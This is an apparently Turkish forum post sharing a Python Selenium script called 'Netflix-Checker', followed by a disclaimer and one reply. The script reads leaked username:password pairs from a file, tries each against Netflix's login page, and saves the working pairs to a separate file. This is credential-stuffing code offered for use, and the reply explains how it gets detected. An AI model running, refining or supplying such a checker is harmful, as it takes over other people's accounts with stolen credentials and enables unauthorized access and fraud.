# Netflix-Checker
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from colorama import Fore, Style



# Dosya varlığını kontrol et ve varsa kullanıcı adı ve şifreyi oku
with open('hesaplar.txt', 'r') as file:
    for line in file:
        username, password = line.strip().split(':')
        print(f"Kullanıcı adı: {username}")

        # Webdriver'ı başlat ve giriş sayfasına git
        browser = webdriver.Chrome()
        browser.get("https://www.netflix.com/tr/login")

        # Bekleyiciyi ayarla
        wait = WebDriverWait(browser, 10)

        # Kullanıcı adı ve şifrenizi girin ve giriş yapın
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[name="userLoginId"]'))).send_keys(username)
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[name="password"]'))).send_keys(password)
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[type="submit"]'))).click()

        try:
            # Profil seçme sayfasının yüklenmesini bekle
            wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '.profile-icon')))
            print(Fore.GREEN + f"Giriş başarılı: {username}" + Style.RESET_ALL)
            # Başarılı hesapları ayrı bir dosyaya kaydet
            with open('basarili_hesaplar.txt', 'a') as f:
                f.write(f"{username}:{password}\n")
        except:
            # Başarısız hesapları ayrı bir dosyaya kaydet
            print(Fore.RED + f"Giriş başarısız: {username}" + Style.RESET_ALL)
            with open('basarisiz_hesaplar.txt', 'a') as f:
                f.write(f"{username}:{password}\n")
        finally:
            # Tarayıcıyı kapat
            browser.quit()

İyi forumlar.
Son düzenleme: Nis 2, 2023
Dikkat:Bu forumda paylaşılan herhangi bir içeriğin sorumluluğunu kabul etmediğimi beyan ederim. Bu forumda paylaşılan herhangi bir materyalin doğruluğunu, eksiksizliğini veya yasallığını garanti etmiyorum ve herhangi bir zarar veya kayıp durumunda sorumlu tutulamazım. Herhangi bir forum kullanıcısı, paylaşılan içeriği kullanmadan önce kendi takdiri ve sorumluluğu altında olmalıdır.

-Koschei97
CevaplaRapor Düzenle
LikeTepkiler: ege3132421, caferzıpcıktı, ane ve 54 diğerleri
Hanx
0 ₺
Bakiye
3
Begeni
.
KatılımEki 14, 2021
Mesajlar27
Tcoin19,820
Mar 24, 2023
Yeri işaretle
#2
Sebebi üst üste denemelerin argoritma algılıyor ve girdiğin uygulamaya tüm hesaplari engeller aynısı bana oldu
 LikeCevaplaRapor
